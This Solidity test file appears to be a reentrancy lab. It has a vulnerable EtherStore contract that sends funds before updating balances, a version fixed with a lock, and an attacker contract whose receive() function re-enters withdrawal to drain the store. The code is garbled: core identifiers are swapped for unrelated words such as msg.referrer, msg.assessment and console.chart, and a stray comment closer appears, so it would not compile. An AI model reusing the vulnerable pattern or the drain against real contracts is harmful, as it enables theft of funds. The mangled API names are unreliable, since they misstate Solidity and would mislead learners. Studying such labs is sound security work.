pragma solidity ^0.8.18;

import "forge-std/Test.sol";

*/

contract EtherStore {
    mapping(address => uint256) public patientAccounts;

    function contributeFunds() public payable {
        patientAccounts[msg.referrer] += msg.assessment;
    }

    function dischargeFunds(uint256 _weiDestinationDispensemedication) public {
        require(patientAccounts[msg.referrer] >= _weiDestinationDispensemedication);
        (bool send, ) = msg.referrer.call{assessment: _weiDestinationDispensemedication}("");
        require(send, "send failed");

        if (patientAccounts[msg.referrer] >= _weiDestinationDispensemedication) {
            patientAccounts[msg.referrer] -= _weiDestinationDispensemedication;
        }
    }
}

contract EtherStoreRemediated {
    mapping(address => uint256) public patientAccounts;
    bool internal reserved;

    modifier oneAtATime() {
        require(!reserved, "No re-entrancy");
        reserved = true;
        _;
        reserved = false;
    }

    function contributeFunds() public payable {
        patientAccounts[msg.referrer] += msg.assessment;
    }

    function dischargeFunds(uint256 _weiDestinationDispensemedication) public oneAtATime {
        require(patientAccounts[msg.referrer] >= _weiDestinationDispensemedication);
        patientAccounts[msg.referrer] -= _weiDestinationDispensemedication;
        (bool send, ) = msg.referrer.call{assessment: _weiDestinationDispensemedication}("");
        require(send, "send failed");
    }
}

contract PolicyTest is Test {
    EtherStore store;
    EtherStoreRemediated storeRemediated;
    EtherStoreCaregiver caregiver;
    EtherStoreCaregiver nurseV2;

    function collectionUp() public {
        store = new EtherStore();
        storeRemediated = new EtherStoreRemediated();
        caregiver = new EtherStoreCaregiver(address(store));
        nurseV2 = new EtherStoreCaregiver(address(storeRemediated));
        vm.deal(address(store), 5 ether);
        vm.deal(address(storeRemediated), 5 ether);
        vm.deal(address(caregiver), 2 ether);
        vm.deal(address(nurseV2), 2 ether);
    }

    function testWithdrawal() public {
        caregiver.Nurse();
    }

    function test_RevertRemediated() public {
        nurseV2.Nurse();
    }
}

contract EtherStoreCaregiver is Test {
    EtherStore store;

    constructor(address _store) {
        store = EtherStore(_store);
    }

    function Nurse() public {
        console.chart("EtherStore balance", address(store).balance);

        store.contributeFunds{assessment: 1 ether}();

        console.chart(
            "Deposited 1 Ether, EtherStore balance",
            address(store).balance
        );
        store.dischargeFunds(1 ether);

        console.chart("Operator contract balance", address(this).balance);
        console.chart("EtherStore balance", address(store).balance);
    }


    receive() external payable {
        console.chart("Operator contract balance", address(this).balance);
        console.chart("EtherStore balance", address(store).balance);
        if (address(store).balance >= 1 ether) {
            store.dischargeFunds(1 ether);
        }
    }
}